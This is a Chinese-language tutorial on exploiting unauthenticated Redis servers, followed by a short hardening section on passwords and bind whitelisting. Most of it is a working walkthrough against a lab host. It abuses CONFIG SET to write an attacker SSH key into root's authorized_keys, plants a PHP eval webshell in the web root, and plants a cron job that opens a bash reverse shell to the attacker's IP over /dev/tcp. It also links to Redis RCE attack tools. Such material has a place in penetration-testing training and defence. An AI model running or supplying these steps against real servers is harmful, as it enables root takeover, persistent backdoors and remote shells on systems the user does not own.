# 一、漏洞介绍

## 1.1原理

Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。

## 1.2必要条件

- v5.0.5以下
- redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网； 
- 没有设置密码认证（一般为空），可以免密码远程登录redis服务。

## 1.3 漏洞危害

- （1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据； 
- （2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件； 
- （3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器

# 二、redis搭建

redis是一种非关系型数据库。

```
#通过wget下载
wget http://download.redis.io/releases/redis-2.8.17.tar.gz  

#解压安装包：
tar -zxvf redis-2.8.17.tar.gz

#进入redis目录
cd redis-2.8.17

#安装：
make

#配置文件拷贝到/etc/
cp redis.conf /etc/

#进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下
cd src
cp redis-server /usr/bin/
cp redis-cli /usr/bin/

#启动redis服务，完成安装
redis-server /etc/redis.conf
```

# 三、漏洞利用

必要条件：

- 目标机的redis服务存在未授权访问，在攻击机上能用redis-cli连上，没有登录验证
- 知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限

## 3.1 利用密钥对获取root权限

```
#以kali为攻击机，扫描目标机的端口，发现开启了6379端口redis服务，按照第二步的步骤在kali上也安装好redis

#在kali上生成ssh密钥对，密码设置为空
root@kali:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:bTHVp5nImet8DprL1EHxikrHOts62DGQc97cwWsXTVw root@kali
The key's randomart image is:
+---[RSA 3072]----+
|            o. .E|
|           . o. +|
|       .  oo.+.B |
|      + .o =B.= .|
|       =So*.o+ . |
|       .+=o.=..  |
|       o+o.+o.   |
|      . o* oo..  |
|        oo*. o.  |
+----[SHA256]-----+


#将生成的公钥保存为1.txt(这里使用echo -e处理特殊字符，否则redis)
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") >1.txt


#将保存ssh的公钥1.txt写入redis数据库
root@kali:~/.ssh# cat 1.txt | redis-cli -h 172.16.105.192 -x set crack
OK
root@kali:~/.ssh# 

#在kali上连接目标redis服务器，查看redis备份路径
root@kali:~/.ssh# redis-cli -h 172.16.105.192
172.16.105.192:6379> config get dir
1) "dir"
2) "/root"

#更改redis备份路径为.ssh/
root@kali:~/.ssh# redis-cli -h 172.16.105.192
172.16.105.192:6379> CONFIG SET dir /root/.ssh
OK

#设置文件名为authorized_keys
172.16.105.192:6379> CONFIG SET dbfilename authorized_keys
OK
172.16.105.192:6379> 

#查看是否修改成功然后保存退出
172.16.105.192:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
172.16.105.192:6379> save
OK
172.16.105.192:6379>exit 

#kali使用密钥登陆目标机即可成功(-i 选择私钥)
ssh -i id_rsa root@172.16.105.192
```



## 3.2利用redis写入webshell

用法跟上面相同，改变路径，写入我们的shell

```
#使用kali连接目标机(-p指定端口，如果不是默认6379端口可用此命令)
redis-cli -h 172.16.105.192 -p 6379

#更改redis备份路径为/var/www/html(一般就尝试改为web常规根目录)
172.16.105.192:6379> CONFIG SET dir /var/www/html
OK

#设置文件名为shell.php
172.16.105.192:6379> CONFIG SET dbfilename shell.php
OK
172.16.105.192:6379>

#写入shell（也可以像之前方法在本地写好传到redis去）
172.16.105.192:6379> set x "<?php @eval($_POST['a'])?>"
OK

#检查没问题保存退出
172.16.105.192:6379> CONFIG GET dir
1) "dir"
2) "/var/www/html"
172.16.105.192:6379> config get dbfilename
1) "dbfilename"
2) "shell.php"
172.16.105.192:6379> save
OK
172.16.105.192:6379> exit

#访问shell.php，即可执行webshell
```

## 3.3 crontab反弹shell

```
#攻击机开启nc监听6666端口
nc -lvvvp 6666

#连接redis，设置路径和文件名,并写入反弹命令(反弹语句记得要写攻击机的ip)
root@kali:~# redis-cli -h 172.16.105.192 -p 6379
172.16.105.192:6379> set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/172.16.105.165/6666 0>&1\n\n"
OK
172.16.105.192:6379> config set dbfilename root
OK
172.16.105.192:6379> config set dir /var/spool/cron
OK
172.16.105.192:6379> save


set x "\r\n\r\n* * * * * /bin/bash -i > /dev/tcp/172.16.105.165/6666 0<&1 2>&1\r\n\r\n"

将计划任务放到定时任务下
config set dir /var/spool/cron/

设置以root用户的身份执行该任务
config set dbfilename root

保存 
save 
```

# 四、redis防御加固

## 4.1 设置访问密码，禁止未授权访问

```
#打开redis.conf配置文件，找到requirepass，然后消除注释，将密码写上
vi /etc/redis.conf
requirepass foobared

#重启服务后，发现可以登录，但是不能执行命令了
root@kali:~# redis-cli -h 172.16.105.192 -p 6379
172.16.105.192:6379> CONFIG GET dir
(error) NOAUTH Authentication required.
172.16.105.192:6379> 

#想要执行命令，就需要设置auth password
172.16.105.192:6379> auth foobared
OK
172.16.105.192:6379> CONFIG GET dir
1) "dir"
2) "/root"
172.16.105.192:6379> 
```

## 4.2 设置访问白名单

```
#打开redis.conf配置文件，找到bind关键字
vi /etc/redis.conf
# Examples:
#
# bind 192.168.1.100 10.0.0.1
# bind 127.0.0.1

把 #bind 127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址
```

# 五、redis攻击工具

1.https://github.com/n0b0dyCN/redis-rogue-server

2.https://github.com/Ridter/redis-rce